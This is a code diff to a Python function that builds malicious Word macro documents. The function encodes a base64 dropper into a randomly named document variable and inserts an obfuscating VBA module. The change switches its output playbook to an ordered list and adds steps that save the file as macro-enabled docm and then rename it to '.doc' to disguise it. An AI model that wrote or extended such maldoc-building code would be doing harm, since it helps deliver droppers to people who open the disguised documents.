@@ -15,7 +15,7 @@ def __ascii_encode_and_rot__(string, rotation):
     return ''.join(result)
 
 def generate(dropperbase64):
-    playbook = dict()  # this will be passed back, as more must be done with the document than just insert
+    playbook = list()  # this will be passed back, as more must be done with the document than just insert
                                      # the VBA
     rot_offset = random.randint(5, 20)
 
@@ -134,9 +134,8 @@ End Function
                     listofallgrammar.append(candidate)
                     lookingforcandidate = 0
                     vba_template = vba_template.replace(i, candidate)
-                    playbook['add_doc_var'] = dict()
-                    playbook['add_doc_var']['name'] = candidate
-                    playbook['add_doc_var']['value'] = encodedpayload
+                    playbook.append({'add_doc_var': {'name': candidate, 'value': encodedpayload}})
+
                 elif i == 'aspecial2':
                     listofallgrammar.append(candidate)
                     lookingforcandidate = 0
@@ -149,6 +148,10 @@ End Function
     for i in re.findall(pattern, vba_template):
         vba_template = vba_template.replace(i, '')
 
-    playbook['add_vba_module'] = vba_template
+    playbook.append({'add_vba_module': vba_template})
+
+    playbook.append({'set_save_format': 'docm'})
+
+    playbook.append({'change_extension_after_save': 'doc'})
 
     return playbook
